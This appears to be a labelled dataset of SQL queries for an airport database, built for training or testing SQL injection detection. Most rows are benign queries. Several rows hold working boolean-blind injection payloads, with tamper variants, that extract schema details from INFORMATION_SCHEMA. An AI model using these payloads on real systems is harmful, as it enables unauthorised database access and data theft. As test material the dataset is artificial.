full_query,label,user_inputs,attack_stage,tamper_method,attack_status,statement_type,query_template_id,attack_id,attack_technique,split
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""Markovo Heliport"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,Markovo Heliport,,,,select,airport-S14,,,test
"DELETE FROM navaids WHERE ident = ""TMS""))
ASyRtI	WHERE9827=9827;SELECT�(CASEWHEN(8020=3522)THEN8020ELSE8020*(SELECT	8020FROMINFORMATION_SCHEMA.PLUGINS)END)#"";",1," TMS""))
ASyRtI	WHERE9827=9827;SELECT�(CASEWHEN(8020=3522)THEN8020ELSE8020*(SELECT	8020FROMINFORMATION_SCHEMA.PLUGINS)END)# ",recon,space2mysqlblank,failure,delete,airport-D6,boolean-138,boolean,test
"SELECT a.name AS airport_name,a.municipality,COUNT(r.id) AS runway_count, CAST(AVG(r.length_ft) AS SIGNED) AS avg_runway_length FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE r.length_ft >=  CAST(""1549"" AS SIGNED) AND a.iso_country = ""MT"" GROUP BY a.id, a.name, a.municipality ORDER BY avg_runway_length DESC;",0,1549 MT,,,,select,airport-S22,,,test
"SELECT n.type, c.name as country_name, COUNT(n.id) as navaid_count  FROM navaids n JOIN countries c ON n.iso_country = c.code WHERE c.code = ""AI"" OR c.name LIKE CONCAT(""%"", ""Trinidad and Tobago"", ""%"") GROUP BY n.type, c.name HAVING COUNT(n.id) > 5 ORDER BY navaid_count DESC;",0,AI Trinidad and Tobago 5,,,,select,airport-S20,,,test
"INSERT INTO airport (ident, type, name, latitude_deg, longitude_deg) VALUES (""KFDW"", ""small_airport"", ""Beas De Segura Airfield"", 33.60211, -122.20654428)",0,KFDW small_airport Beas De Segura Airfield 33.60211 -122.20654428,,,,insert,airport-I1,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""VN"" GROUP BY r.name ORDER BY r.name ASC;",0,VN,,,,select,airport-S5,,,test
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"") OR a.elevation_ft > 833.0",0,US 833.0,,,,select,airport-S11,,,test
"UPDATE airport_frequencies SET frequency_mhz = 121.73 WHERE type = ""A/D"";",0,121.73 A/D,,,,update,airport-U6,,,test
"SELECT name, 'airport' AS type FROM airport WHERE keywords LIKE CONCAT(""%"",  ""WA81, Fishermans Bay/LPS Seaplane Base"", ""%"") UNION SELECT name, 'region' FROM regions WHERE keywords LIKE CONCAT(""%"", ""1MI1"", ""%"") UNION SELECT name, 'country' FROM countries WHERE keywords LIKE CONCAT(""%"", ""BG2"", ""%"");",0,"WA81, Fishermans Bay/LPS Seaplane Base 1MI1 BG2",,,,select,airport-S17,,,test
"SELECT name, IFNULL(iata_code, 'NO_IATA') AS iata_display, IFNULL(icao_code, 'NO_ICAO') AS icao_display,  MID(name, 1, 5) AS short_name, municipality FROM airport WHERE municipality LIKE ""Janos;""",0,Janos,,,,select,airport-S21,,,test
"DELETE FROM airport WHERE name LIKE ""Pico Etéreo Airport"" OR keywords LIKE ""Camp Ashoro. JGSDF"";  ",0,Pico Etéreo Airport Camp Ashoro. JGSDF,,,,delete,airport-D3,,,test
"SELECT * FROM airport WHERE gps_code = ""MU85"" OR local_code = ""RS0217""",0,MU85 RS0217,,,,select,airport-S4,,,test
"SELECT id FROM airports WHERE longitude BETWEEN -88.344737 AND -53.258389 AND scheduled_service LIKE ""no""",0,-88.344737 -53.258389 no,,,,select,airport-S23,,,test
USE sys,0,,,,,admin,airport-admin1,,,test
"SELECT id, ident, name FROM airport WHERE iso_country = ""US""",0,US,,,,select,airport-S6,,,test
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""WZ59"") OR name LIKE ""Keravat, Karavat, Tavelo, Tavilo""",0,"WZ59 Keravat, Karavat, Tavelo, Tavilo",,,,select,airport-S10,,,test
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""JP"") OR a.elevation_ft > 3760.0",0,JP 3760.0,,,,select,airport-S11,,,train
"DELETE FROM navaids WHERE ident = ""VRA"";",0,VRA,,,,delete,airport-D6,,,test
"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""AU""",0,AU,,,,select,airport-S9,,,test
"DELETE FROM airport_frequencies WHERE type = ""Safety Comm"";",0,Safety Comm,,,,delete,airport-D4,,,test
"SELECT name, 'airport' AS type FROM airport WHERE keywords LIKE CONCAT(""%"",  ""GYA"", ""%"") UNION SELECT name, 'region' FROM regions WHERE keywords LIKE CONCAT(""%"", ""SJCF, SIIX"", ""%"") UNION SELECT name, 'country' FROM countries WHERE keywords LIKE CONCAT(""%"", ""RJ6YZ"", ""%"");",0,"GYA SJCF, SIIX RJ6YZ",,,,select,airport-S17,,,test
"DELETE FROM airport_frequencies WHERE type = ""A/D"";",0,A/D,,,,delete,airport-D4,,,test
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""Békéscsaba (city)"";",0,Békéscsaba (city),,,,select,airport-S15,,,test
"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""RU""",0,RU,,,,select,airport-S9,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""BH"" GROUP BY r.name ORDER BY r.name ASC;",0,BH,,,,select,airport-S5,,,test
"DELETE FROM regions WHERE name = ""Mamou Region"";",0,Mamou Region,,,,delete,airport-D8,,,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Mary Immaculate Hospital Heliport"");",0,Mary Immaculate Hospital Heliport,,,,select,airport-S12,,,test
"INSERT INTO countries (code, name, continent, keywords) VALUES (""SD"" LIKE ""SD"" AND ELT(ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name LIKE 0x616972706f7274 AND table_schema LIKE 0x64617461736574 LIMIT 10,1),11,1))>114,6563) AND ""SD"" LIKE ""SD"", ""Tanzania"", ""EU"", ""Airports in Sint Maarten"")",1," SD"" LIKE ""SD"" AND ELT(ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name LIKE 0x616972706f7274 AND table_schema LIKE 0x64617461736574 LIMIT 10,1),11,1))>114,6563) AND ""SD"" LIKE ""SD Tanzania EU Airports in Sint Maarten ",exploit,equaltolike,success,insert,airport-I6,boolean-30,boolean,test
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 1837.0 AND 775.0",0,1837.0 775.0,,,,select,airport-S2,,,test
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""SPPM, SPPM"") OR name LIKE ""Matsuwa, Cape Tagan, USEK""",0,"SPPM, SPPM Matsuwa, Cape Tagan, USEK",,,,select,airport-S10,,,test
SELECT * FROM airport WHERE icao_code = 'SBGO';,0,SBGO,,,,select,airport-S1,,,test
"GRANT SELECT,INSERT,DELETE,UPDATE ON users.* TO 'ec2-user'@'localhost';",0,,,,,admin,airport-admin9,,,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Tarry Bank Airport"") and 8191=(select (case when (ord(mid((select ifnull(cast(column_name as nchar),0x20) from INFORMATION_SCHEMA.columns where table_name=0x616972706f7274 and table_schema=0x64617461736574 limit 11,1),10,1))>93) then 8191 else (select 7920 union select 3426) end))-- -"");",1," Tarry Bank Airport"") and 8191=(select (case when (ord(mid((select ifnull(cast(column_name as nchar),0x20) from INFORMATION_SCHEMA.columns where table_name=0x616972706f7274 and table_schema=0x64617461736574 limit 11,1),10,1))>93) then 8191 else (select 7920 union select 3426) end))-- - ",exploit,lowercase,success,select,airport-S12,boolean-222,boolean,test
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"") OR a.elevation_ft > 324.0",0,US 324.0,,,,select,airport-S11,,,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Niagara Falls International Airport"");",0,Niagara Falls International Airport,,,,select,airport-S12,,,test
"UPDATE airport_frequencies SET type = 'TWR' WHERE airport_ident IN ('PL-0167','JP-2261','ZA-0012','SI6Q');",0,PL-0167 JP-2261 ZA-0012 SI6Q,,,,update,airport-U10,,,test
"SELECT name, IFNULL(iata_code, 'NO_IATA') AS iata_display, IFNULL(icao_code, 'NO_ICAO') AS icao_display,  MID(name, 1, 5) AS short_name, municipality FROM airport WHERE municipality LIKE ""Beachwood;""",0,Beachwood,,,,select,airport-S21,,,test
"SELECT id FROM airports WHERE name LIKE ""%Gq3P8oFfOcUeffQAQo7l%"" OR name LIKE ""%qKSMzB0MXitG33yY3rAS%"" AND type LIKE ""small_airport"" AND scheduled_service LIKE ""no"" AND continent = ""SA"" AND latitude >= -36.889999 AND longitude <= -1.643611",0,Gq3P8oFfOcUeffQAQo7l qKSMzB0MXitG33yY3rAS small_airport no SA -36.889999 -1.643611,,,,select,airport-S23,,,test
"INSERT INTO regions (code, local_code, name, continent, iso_country) VALUES (""BT-34"", ""07"", ""Zaporizhia Oblast"", ""EU"", ""LB"")",0,BT-34 07 Zaporizhia Oblast EU LB,,,,insert,airport-I5,,,train
SELECT * FROM airport WHERE icao_code = 'UKFP';,0,UKFP,,,,select,airport-S1,,,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Machmell Airport"");",0,Machmell Airport,,,,select,airport-S12,,,test
"INSERT INTO countries (code, name, continent) VALUES (""LV"", ""Mozambique"", ""AF"")",0,LV Mozambique AF,,,,insert,airport-I7,,,test
"SELECT name, 'airport' AS entity_type FROM airport WHERE keywords LIKE CONCAT(""%"", ""XS73"", ""%"") UNION SELECT name, 'region' AS entity_type FROM regions WHERE keywords LIKE CONCAT(""%"", ""Airports in Burdur Province"", ""%"")  UNION SELECT name, 'country' AS entity_type FROM countries WHERE keywords LIKE CONCAT(""%"", ""Siam, Siamese"", ""%"");",0,"XS73 Airports in Burdur Province Siam, Siamese",,,,select,airport-S18,,,test
"SELECT * FROM airport WHERE continent = ""EU"" AND iso_region LIKE ""US-ND""",0,EU US-ND,,,,select,airport-S8,,,test
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""Circle Bar Ranch Airport"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,Circle Bar Ranch Airport,,,,select,airport-S14,,,test
"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""DE""",0,DE,,,,select,airport-S9,,,test
"SELECT af.type, af.description, af.frequency_mhz FROM airport_frequencies af WHERE af.airport_ident = ""JP-1484"";",0,JP-1484,,,,select,airport-S7,,,test
"DELETE FROM navaids WHERE ident = ""THS"";",0,THS,,,,delete,airport-D6,,,test
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""IT"") OR a.elevation_ft > 507.0",0,IT 507.0,,,,select,airport-S11,,,test
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 560.0 AND 929.0",0,560.0 929.0,,,,select,airport-S2,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""SA"" GROUP BY r.name ORDER BY r.name ASC;",0,SA,,,,select,airport-S16,,,test
"SELECT * FROM airport WHERE continent = ""AF"" AND iso_region LIKE ""US-NY""",0,AF US-NY,,,,select,airport-S8,,,train
"SELECT 'Airport Frequency' as source_type, af.airport_ident as code, a.name as location_name, af.type as frequency_type, af.frequency_mhz as frequency, af.description, a.municipality, a.iso_country FROM airport_frequencies af JOIN airport a ON af.airport_ident = a.ident WHERE af.frequency_mhz BETWEEN 120.5 AND  119.7  UNION ALL SELECT 'Navaid Frequency' as source_type,    n.ident as code, n.name as location_name, n.type as frequency_type,n.frequency_khz / 1000.0 as frequency,  n.usageType as description, 'N/A' as municipality, n.iso_country FROM navaids n WHERE n.frequency_khz IS NOT NULL AND (n.frequency_khz / 1000.0) BETWEEN  119.025  AND  122.8  ORDER BY frequency;",0,120.5 119.7 119.025 122.8,,,,select,airport-S13,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""GE"" GROUP BY r.name ORDER BY r.name ASC;",0,GE,,,,select,airport-S16,,,test
"UPDATE airport SET name = ""Adisumarmo Airport"" WHERE ident = ""80TE""",0,Adisumarmo Airport 80TE,,,,update,airport-U1,,,test
"SELECT af.type, af.description, af.frequency_mhz FROM airport_frequencies af WHERE af.airport_ident = ""4XA2"";",0,4XA2,,,,select,airport-S7,,,test
"SELECT * FROM airport WHERE gps_code = ""YMHT"" OR local_code = ""NM29""",0,YMHT NM29,,,,select,airport-S4,,,test
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""LV"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 4 ORDER BY runway_count DESC, a.name ASC;",0,LV 4,,,,select,airport-S19,,,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Clifford Field"");",0,Clifford Field,,,,select,airport-S12,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""UM"" GROUP BY r.name ORDER BY r.name ASC;",0,UM,,,,select,airport-S16,,,train
SELECT * FROM airport WHERE icao_code = 'VYPY';,0,VYPY,,,,select,airport-S1,,,test
"SELECT * FROM airport WHERE continent = ""SA"" AND iso_region LIKE ""SE-Q""",0,SA SE-Q,,,,select,airport-S8,,,test
"UPDATE airport_frequencies SET type = 'TWR' WHERE airport_ident IN ('UA-0129','US-2541','US-7294','FR-0003');",0,UA-0129 US-2541 US-7294 FR-0003,,,,update,airport-U10,,,test
"DELETE FROM regions WHERE name = ""South Region"" AND 1924 LIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name LIKE 0x616972706f7274 AND table_schema LIKE 0x64617461736574 LIMIT 16,1),5,1))>96) THEN 1924 ELSE (SELECT 3262 UNION SELECT 3700) END))-- -"";",1," South Region"" AND 1924 LIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name LIKE 0x616972706f7274 AND table_schema LIKE 0x64617461736574 LIMIT 16,1),5,1))>96) THEN 1924 ELSE (SELECT 3262 UNION SELECT 3700) END))-- - ",exploit,equaltolike,success,delete,airport-D8,boolean-150,boolean,test
"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""AR""",0,AR,,,,select,airport-S9,,,test
"SELECT name, 'airport' AS entity_type FROM airport WHERE keywords LIKE CONCAT(""%"", ""MM17, La Retama Southwest"", ""%"") UNION SELECT name, 'region' AS entity_type FROM regions WHERE keywords LIKE CONCAT(""%"", ""Airports in Dedza District"", ""%"")  UNION SELECT name, 'country' AS entity_type FROM countries WHERE keywords LIKE CONCAT(""%"", ""Airports in San Marino"", ""%"");",0,"MM17, La Retama Southwest Airports in Dedza District Airports in San Marino",,,,select,airport-S18,,,test
"DELETE FROM airport_frequencies WHERE type = ""TWR"";",0,TWR,,,,delete,airport-D4,,,test
SELECT * FROM airport WHERE icao_code = 'EGLC';,0,EGLC,,,,select,airport-S1,,,test
"INSERT INTO runways (airport_ref, airport_ident, length_ft, surface, lighted, closed) VALUES (26130, ""5TE1"", 4300.0, ""grass"", 0, 0)",0,26130 5TE1 4300.0 grass 0 0,,,,insert,airport-I9,,,test
"SELECT id FROM airports WHERE latitude >= 40.827202 AND continent = ""SA"" AND type LIKE ""heliport"" AND scheduled_service = ""no"" AND elevation_feet >= 72.0",0,40.827202 SA heliport no 72.0,,,,select,airport-S23,,,test
"SELECT 'Airport Frequency' as source_type, af.airport_ident as code, a.name as location_name, af.type as frequency_type, af.frequency_mhz as frequency, af.description, a.municipality, a.iso_country FROM airport_frequencies af JOIN airport a ON af.airport_ident = a.ident WHERE af.frequency_mhz BETWEEN 122.7 AND  126.2  UNION ALL SELECT 'Navaid Frequency' as source_type,    n.ident as code, n.name as location_name, n.type as frequency_type,n.frequency_khz / 1000.0 as frequency,  n.usageType as description, 'N/A' as municipality, n.iso_country FROM navaids n WHERE n.frequency_khz IS NOT NULL AND (n.frequency_khz / 1000.0) BETWEEN  121.2  AND  122.9  ORDER BY frequency;",0,122.7 126.2 121.2 122.9,,,,select,airport-S13,,,test
"SELECT 'Airport Frequency' as source_type, af.airport_ident as code, a.name as location_name, af.type as frequency_type, af.frequency_mhz as frequency, af.description, a.municipality, a.iso_country FROM airport_frequencies af JOIN airport a ON af.airport_ident = a.ident WHERE af.frequency_mhz BETWEEN 125.9 AND  127.7  UNION ALL SELECT 'Navaid Frequency' as source_type,    n.ident as code, n.name as location_name, n.type as frequency_type,n.frequency_khz / 1000.0 as frequency,  n.usageType as description, 'N/A' as municipality, n.iso_country FROM navaids n WHERE n.frequency_khz IS NOT NULL AND (n.frequency_khz / 1000.0) BETWEEN  127.575  AND  118.4  ORDER BY frequency;",0,125.9 127.7 127.575 118.4,,,,select,airport-S13,,,test
"SELECT * FROM airport WHERE gps_code = ""YAMT"" OR local_code = ""50F""",0,YAMT 50F,,,,select,airport-S4,,,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Tarry Bank Airport"") and 1788=(select (case when (ord(mid((select ifnull(cast(column_name as nchar),0x20) from INFORMATION_SCHEMA.columns where table_name=0x616972706f7274 and table_schema=0x64617461736574 limit 13,1),1,1))>64) then 1788 else (select 4498 union select 1354) end))-- -"");",1," Tarry Bank Airport"") and 1788=(select (case when (ord(mid((select ifnull(cast(column_name as nchar),0x20) from INFORMATION_SCHEMA.columns where table_name=0x616972706f7274 and table_schema=0x64617461736574 limit 13,1),1,1))>64) then 1788 else (select 4498 union select 1354) end))-- - ",exploit,lowercase,success,select,airport-S12,boolean-222,boolean,test
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""MI36"") OR name LIKE ""MCH, SEMH""",0,"MI36 MCH, SEMH",,,,select,airport-S10,,,test
SELECT id FROM airports WHERE longitude <= -83.072998 AND elevation_feet >= 2083.0,0,-83.072998 2083.0,,,,select,airport-S23,,,test
"SELECT af.type, af.description, af.frequency_mhz FROM airport_frequencies af WHERE af.airport_ident = ""US-4517"";",0,US-4517,,,,select,airport-S7,,,train
"INSERT INTO runways (airport_ref, airport_ident, length_ft, surface, lighted, closed) VALUES ((select (case when (ord(mid((select ifnull(cast(column_name as nchar),0x20) from INFORMATION_SCHEMA.columns where table_name=0x616972706f7274 and table_schema=0x64617461736574 limit 4,1),10,1))>112) then 23192 else (select 7026 union select 4189) end)), ""LKMO"", 2290.0, ""ASPH-P"", 1, 0)",1," (select (case when (ord(mid((select ifnull(cast(column_name as nchar ,0x20  from INFORMATION_SCHEMA.columns where table_name=0x616972706f7274 and table_schema=0x64617461736574 limit 4,1 ,10,1  >112  then 23192 else (select 7026 union select 4189  end   LKMO 2290.0 ASPH-P 1 0 ",exploit,lowercase,success,insert,airport-I9,boolean-48,boolean,test
